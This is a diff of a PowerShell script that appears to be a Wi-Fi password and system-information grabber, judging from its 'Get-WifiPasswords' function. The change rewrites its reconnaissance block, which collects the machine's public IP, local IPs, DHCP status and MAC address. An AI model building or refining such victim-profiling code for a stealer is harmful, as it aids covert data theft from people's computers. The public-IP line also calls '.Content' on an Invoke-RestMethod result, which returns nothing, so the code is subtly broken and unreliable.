@@ -104,26 +104,33 @@ function Get-WifiPasswords {
 # Get info about pc
 
 # Get IP / Network Info
-try
-{
-$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-}
-catch
-{
-$computerPubIP=" Error getting Public IP"
+try {
+    # Retrieve public IP address
+    $computerPubIP = (Invoke-RestMethod -Uri "https://api.ipify.org").Content
+} catch {
+    $computerPubIP = "Error getting Public IP"
 }
 
-$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+# Retrieve local IP addresses using Get-CimInstance
+try {
+    $computerIPs = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
+    $localIP = $computerIPs -join ", "
+} catch {
+    $localIP = "Error getting local IP addresses"
+}
 
-############################################################################################################################################################
-
+# Check if DHCP is enabled and retrieve the MAC address
 $IsDHCPEnabled = $false
-$Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
-foreach ($Network in $Networks) {
-If($network.DHCPEnabled) {
-$IsDHCPEnabled = $true
-  }
-$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
+try {
+    $Networks = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.DHCPEnabled -eq $true }
+    if ($Networks) {
+        $IsDHCPEnabled = $true
+    }
+
+    # Retrieve the MAC address
+    $MAC = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1 -ExpandProperty MacAddress
+} catch {
+    $MAC = "Error getting MAC address"
 }
 
 ############################################################################################################################################################
